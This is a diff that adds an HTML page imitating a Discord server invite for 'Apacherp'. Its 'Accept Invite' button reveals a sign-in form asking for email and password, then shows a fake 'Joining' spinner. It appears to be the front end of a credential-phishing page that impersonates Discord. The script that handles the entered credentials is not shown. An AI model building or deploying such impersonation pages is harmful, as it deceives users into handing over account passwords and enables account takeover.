@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Invite</title>
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="card">
+
+    <!-- Invite Page -->
+    <div id="invitePage">
+
+        <div class="icon"></div>
+
+        <p class="invite-text">
+            YOU'VE BEEN INVITED TO JOIN
+        </p>
+
+        <h1>Apacherp</h1>
+
+
+        <div class="stats">
+
+            <div class="stat">
+                <span class="online"></span>
+                521 Online
+            </div>
+
+            <div class="stat">
+                <span class="members"></span>
+                2,321 Members
+            </div>
+
+        </div>
+
+
+        <button id="acceptBtn">
+            Accept Invite
+        </button>
+
+    </div>
+
+
+
+    <!-- Login Page -->
+    <div id="loginPage" class="hidden">
+
+        <h2>Sign In</h2>
+
+
+        <input
+            type="email"
+            id="username"
+            placeholder="Email Address"
+            autocomplete="email"
+        >
+
+        <small id="usernameError" class="error-message"></small>
+
+
+        <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            autocomplete="current-password"
+        >
+
+
+        <button id="loginBtn">
+            Login
+        </button>
+
+
+        <button class="back-btn" id="backBtn">
+            Back
+        </button>
+
+
+
+        <!-- Loading Overlay -->
+        <div id="loading" class="loading-overlay hidden">
+
+
+            <div class="loading-content">
+
+
+                <!-- Server Profile Picture -->
+                <div class="loading-icon"></div>
+
+
+                <h3>
+                    Joining...
+                </h3>
+
+
+                <p>
+                    Joining Apacherp Community
+                </p>
+
+
+                <div class="spinner"></div>
+
+
+            </div>
+
+
+        </div>
+
+
+    </div>
+
+
+</div>
+
+
+<script src="script.js"></script>
+
+</body>
+</html>
